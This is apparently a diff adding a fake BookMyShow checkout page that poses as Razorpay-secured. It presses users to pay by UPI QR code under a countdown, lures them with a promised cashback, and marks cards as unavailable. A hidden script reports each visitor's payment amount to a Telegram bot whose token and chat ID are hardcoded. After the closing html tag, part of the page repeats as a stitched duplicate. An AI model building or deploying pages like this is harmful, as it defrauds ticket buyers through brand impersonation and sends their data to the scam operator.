@@ -1,0 +1,404 @@
+                     <html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" type="image/svg+xml" href="/vite.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Payment</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <script type="module" src="assets/index-ck3X7H0s.js"></script>
+    <link rel="stylesheet" href="assets/index-DOFwVbkK.css">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    fbq('init', '1252040857081560');
+    fbq('track', 'PageView');
+    fbq('track', 'InitiateCheckout'); /* Ye bhi add kar diya taki payment page track ho sake */
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/></noscript>
+    <style jsx="true">
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .payment-option {
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .payment-option:hover {
+            background-color: #f8fafc;
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+
+        .payment-option.active {
+            border-color: #4f46e5;
+            background-color: #f5f3ff;
+            box-shadow: 0 0 0 2px #e0e7ff;
+        }
+
+        .qr-code-container {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .payment-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+
+        .accordion-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: none;
+        }
+
+        .accordion-content.open {
+            max-height: 2000px;
+            display: block;
+            padding: 0;
+            background: #f9f9f9;
+            border-radius: 5px;
+        }
+
+        .payment-logo {
+            max-height: 28px;
+            object-fit: contain;
+            filter: grayscale(0.2);
+        }
+
+        .glassmorphism {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .payment-method-container {
+            transition: all 0.5s ease;
+        }
+
+        .payment-method-container:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+
+        @media (max-width: 480px) {
+            .upi-id-container {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .upi-text {
+                max-width: 100%;
+                text-align: center;
+                font-size: 0.9rem;
+                padding: 6px 0;
+                word-break: break-all;
+            }
+            
+            #qr-code-img {
+                min-width: 150px !important;
+                min-height: 150px !important;
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div id="root">
+        <div class="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 pb-20 md:pb-0">
+            
+            <header class="glassmorphism sticky top-0 z-50 py-3 px-3 sm:px-6 flex justify-between items-center shadow-sm">
+                <div class="flex items-center space-x-2 sm:space-x-4">
+                    <button class="hover:bg-gray-100 p-1.5 sm:p-2 rounded-full transition-all" aria-label="Go back">
+                        <i class="fas fa-arrow-left text-gray-600 text-sm sm:text-base"></i>
+                    </button>
+                    <img alt="BookMyShow" class="h-6 sm:h-8 hover:opacity-90 transition-opacity" src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png">
+                    <div class="hidden sm:block h-6 w-px bg-gray-200"></div>
+                    <span class="hidden sm:inline text-sm font-medium text-gray-600">Secure Checkout</span>
+                </div>
+                <div class="flex items-center space-x-1 sm:space-x-2 bg-green-50 px-2 sm:px-3 py-1 sm:py-1.5 rounded-full border border-green-100">
+                    <i class="fas fa-shield-alt text-green-600 text-xs sm:text-sm"></i>
+                    <span class="text-[10px] sm:text-sm font-medium text-green-700">100% Secure</span>
+                </div>
+            </header>
+
+            <div class="container mx-auto py-4 px-3 sm:px-4 md:px-6">
+                <div class="flex flex-col md:flex-row gap-6 max-w-4xl mx-auto">
+                    
+                    <div class="w-full md:w-full">
+                        
+                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 payment-method-container">
+                            
+                            <div class="p-4 sm:p-6 border-b border-gray-100">
+                                <h2 class="text-lg sm:text-xl font-semibold text-gray-800">Choose Payment Method</h2>
+                                <p class="text-xs sm:text-sm text-gray-500 mt-1">All transactions are secure and encrypted</p>
+                            </div>
+                            
+                            <div class="p-3 sm:p-4 border-b border-gray-100">
+                                <button class="w-full text-left py-2 px-2 rounded-lg payment-option active">
+                                    <div class="flex items-center justify-between w-full">
+                                        <div class="flex items-center">
+                                            <div class="payment-icon bg-green-100 rounded-full p-2 mr-3">
+                                                <i class="fa-solid fa-qrcode text-green-600"></i>
+                                            </div>
+                                            <span class="font-medium text-sm sm:text-base mr-2">UPI/QR</span>
+                                            <img alt="UPI Payment Options" class="payment-logo hidden sm:block" src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png">
+                                        </div>
+                                        <i class="fa-solid fa-chevron-up text-gray-600"></i>
+                                    </div>
+                                </button>
+
+                                <div class="accordion-content open w-full">
+                                    <div class="mt-3 p-3 sm:p-5 border border-gray-200 rounded-xl bg-gradient-to-b from-white to-gray-50">
+                                        <div class="qr-code-container text-center">
+                                            
+                                            <div class="mb-4">
+                                                <div class="text-xs sm:text-sm font-medium text-gray-700 mb-2">
+                                                    Scan the QR within <span id="countdown" class="text-red-600 font-bold">10:00</span>
+                                                </div>
+
+                                                <div class="mb-4 bg-white p-3 sm:p-4 rounded-xl border border-gray-100 shadow-sm">
+                                                    <p class="text-xs sm:text-sm font-medium text-gray-700 mb-2">UPI ID</p>
+                                                    <div class="upi-id-container flex flex-col sm:flex-row items-center justify-center gap-2 sm:gap-3 flex-wrap">
+                                                        <input type="hidden" id="upiID" value="">
+                                                        <span id="upi-text" class="text-gray-800 font-medium text-sm sm:text-base bg-gray-50 px-3 py-1 rounded w-full sm:w-auto break-all">Loading...</span>
+                                                        <button type="button" onclick="window.copyUpi()" class="w-full sm:w-auto text-blue-600 bg-blue-50 border border-blue-100 text-xs sm:text-sm font-semibold px-4 py-1.5 rounded-lg hover:bg-blue-100 transition-colors">
+                                                            <i class="fa-regular fa-copy mr-1"></i> Copy
+                                                        </button>
+                                                    </div>
+                                                    <p class="text-xs sm:text-sm text-gray-500 mt-3">Amount to pay: <span class="font-bold text-gray-800 text-sm sm:text-base final_paid_price">₹0</span></p>
+                                                </div>
+                                            </div>
+
+                                            <div class="relative inline-block bg-white p-2 rounded-xl shadow-sm border border-gray-100">
+                                                <img id="qr-code-img" alt="Payment QR Code" class="mx-auto rounded-lg" src="" style="width: 100%; max-width: 180px; height: auto; aspect-ratio: 1/1;">
+                                            </div>
+
+                                            <div class="mt-3 text-xs sm:text-sm font-medium text-gray-500">Scan the QR using any UPI App</div>
+
+                                            <div class="flex justify-center gap-8 sm:gap-10 mt-6">
+                                                <a id="phonepe-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
+                                                    <img alt="PhonePe" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/phonepe.svg">
+                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">PhonePe</span>
+                                                </a>
+                                                <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
+                                                    <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
+                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
+                                                </a>
+                                            </div>
+                                            
+                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center">Waiting for payment confirmation...</p>
+
+                                            <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-lg p-3 sm:p-4 text-center mx-1 mt-4 mb-2 shadow-sm">
+                                                <p class="text-[10px] sm:text-xs text-[#166534] leading-relaxed">
+                                                    <i class="fas fa-tag mr-1 text-[#22c55e]"></i> <strong>Upto ₹2,503 cashback.</strong> You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.
+                                                </p>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="border-t border-gray-100 mx-4 py-4 flex justify-between items-center opacity-70 cursor-not-allowed">
+                                <div class="flex items-center gap-3">
+                                    <div class="text-[#8b5cf6] w-6 text-center">
+                                        <i class="fas fa-credit-card text-lg sm:text-xl"></i>
+                                    </div>
+                                    <span class="font-semibold text-gray-800 text-sm sm:text-base">Cards</span>
+                                </div>
+                                <span class="text-xs sm:text-sm font-semibold text-red-500">Server Unavailable</span>
+                            </div>
+                            
+                        </div>
+                        
+                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mt-6 payment-method-container">
+                            <div class="flex justify-between items-center p-4 sm:p-5 border-b border-gray-100">
+                                <div>
+                                    <div class="text-xs text-gray-500 font-medium mb-1">Amount to be Paid</div>
+                                    <div class="text-xl sm:text-2xl font-bold text-gray-900 final_paid_price">₹0</div>
+                                </div>
+                                <a href="#" class="text-xs sm:text-sm font-semibold text-blue-600 hover:underline">View Details</a>
+                            </div>
+
+                            <div class="p-4 sm:p-5 flex flex-col items-center bg-gray-50/50">
+                                <div class="flex items-center text-gray-500 text-[10px] uppercase font-semibold tracking-wider mb-2">
+                                    <i class="fas fa-lock mr-1.5 text-xs"></i> Secured by
+                                </div>
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Razorpay_logo.svg" alt="Razorpay" class="h-5 sm:h-6 mb-4 sm:mb-5">
+
+                                <div class="bg-white w-full rounded-xl p-3 flex items-start gap-2 border border-gray-100 mb-3 shadow-sm">
+                                    <i class="fas fa-shield-check text-green-600 mt-0.5 text-sm"></i>
+                                    <p class="text-[10px] sm:text-[11px] text-gray-600 leading-tight">Your payment information is secure and encrypted</p>
+                                </div>
+
+                                <a href="#" class="text-[10px] sm:text-[11px] text-blue-600 hover:underline">Payment Terms & Privacy Policy</a>
+                            </div>
+                        </div>
+
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            let timeLeft = 10 * 60; // 10 minutes in seconds
+            const timerEl = document.getElementById('countdown');
+            
+            if(timerEl) {
+                const countdownInterval = setInterval(() => {
+                    if(timeLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        timerEl.innerText = "0:00";
+                        return;
+                    }
+                    timeLeft--;
+                    let m = Math.floor(timeLeft / 60);
+                    let s = timeLeft % 60;
+                    timerEl.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                }, 1000);
+            }
+        });
+    </script>
+    
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+            const chatId = "6820660513";
+            const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
+            
+            const message = `🚨 *New User on Payment Page!*\n\n💰 *Amount:* ₹${finalPrice}\n🌐 *Page:* Checkout/Payment`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error("Telegram Error:", err));
+        });
+    </script>
+
+    <script type="module" src="js/payment.js"></script>
+</body>
+</html>
+                        </a>
+                                                <a id="paytm-link" href="#" class="upi-app-link flex flex-col items-center hover:opacity-80 transition-opacity">
+                                                    <img alt="Paytm" class="w-12 h-12 sm:w-14 sm:h-14 object-contain drop-shadow-sm" src="https://cdn.razorpay.com/app/paytm.svg">
+                                                    <span class="text-[11px] sm:text-xs font-medium mt-2 text-gray-600">Paytm</span>
+                                                </a>
+                                            </div>
+                                            
+                                            <p id="redirect-countdown" class="text-xs sm:text-sm text-indigo-600 font-medium mt-4 text-center">Waiting for payment confirmation...</p>
+
+                                            <div class="bg-[#f0fdf4] border border-[#dcfce7] rounded-lg p-3 sm:p-4 text-center mx-1 mt-4 mb-2 shadow-sm">
+                                                <p class="text-[10px] sm:text-xs text-[#166534] leading-relaxed">
+                                                    <i class="fas fa-tag mr-1 text-[#22c55e]"></i> <strong>Upto ₹2,503 cashback.</strong> You will receive this cashback within 48 hours once the ticket is confirmed. It will be credited after the ticket confirmation happens within 24 hours.
+                                                </p>
+                                            </div>
+                                            
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="border-t border-gray-100 mx-4 py-4 flex justify-between items-center opacity-70 cursor-not-allowed">
+                                <div class="flex items-center gap-3">
+                                    <div class="text-[#8b5cf6] w-6 text-center">
+                                        <i class="fas fa-credit-card text-lg sm:text-xl"></i>
+                                    </div>
+                                    <span class="font-semibold text-gray-800 text-sm sm:text-base">Cards</span>
+                                </div>
+                                <span class="text-xs sm:text-sm font-semibold text-red-500">Server Unavailable</span>
+                            </div>
+                            
+                        </div>
+                        
+                        <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100 mt-6 payment-method-container">
+                            <div class="flex justify-between items-center p-4 sm:p-5 border-b border-gray-100">
+                                <div>
+                                    <div class="text-xs text-gray-500 font-medium mb-1">Amount to be Paid</div>
+                                    <div class="text-xl sm:text-2xl font-bold text-gray-900 final_paid_price">₹0</div>
+                                </div>
+                                <a href="#" class="text-xs sm:text-sm font-semibold text-blue-600 hover:underline">View Details</a>
+                            </div>
+
+                            <div class="p-4 sm:p-5 flex flex-col items-center bg-gray-50/50">
+                                <div class="flex items-center text-gray-500 text-[10px] uppercase font-semibold tracking-wider mb-2">
+                                    <i class="fas fa-lock mr-1.5 text-xs"></i> Secured by
+                                </div>
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Razorpay_logo.svg" alt="Razorpay" class="h-5 sm:h-6 mb-4 sm:mb-5">
+
+                                <div class="bg-white w-full rounded-xl p-3 flex items-start gap-2 border border-gray-100 mb-3 shadow-sm">
+                                    <i class="fas fa-shield-check text-green-600 mt-0.5 text-sm"></i>
+                                    <p class="text-[10px] sm:text-[11px] text-gray-600 leading-tight">Your payment information is secure and encrypted</p>
+                                </div>
+
+                                <a href="#" class="text-[10px] sm:text-[11px] text-blue-600 hover:underline">Payment Terms & Privacy Policy</a>
+                            </div>
+                        </div>
+
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            let timeLeft = 10 * 60; // 10 minutes in seconds
+            const timerEl = document.getElementById('countdown');
+            
+            if(timerEl) {
+                const countdownInterval = setInterval(() => {
+                    if(timeLeft <= 0) {
+                        clearInterval(countdownInterval);
+                        timerEl.innerText = "0:00";
+                        return;
+                    }
+                    timeLeft--;
+                    let m = Math.floor(timeLeft / 60);
+                    let s = timeLeft % 60;
+                    timerEl.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                }, 1000);
+            }
+        });
+    </script>
+
+    <script type="module" src="js/payment.js"></script>
+</body>
+</html>
